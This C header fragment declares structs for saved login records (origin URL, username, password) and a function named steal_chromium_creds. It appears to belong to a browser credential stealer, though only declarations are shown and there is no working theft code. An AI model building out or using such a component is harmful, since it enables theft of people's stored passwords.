typedef struct {
  char *origin_url;
  char *username;
  char *password;
} LoginInfo;

typedef struct {
  LoginInfo* data;
  int size;
} LoginInfos;

int steal_chromium_creds();
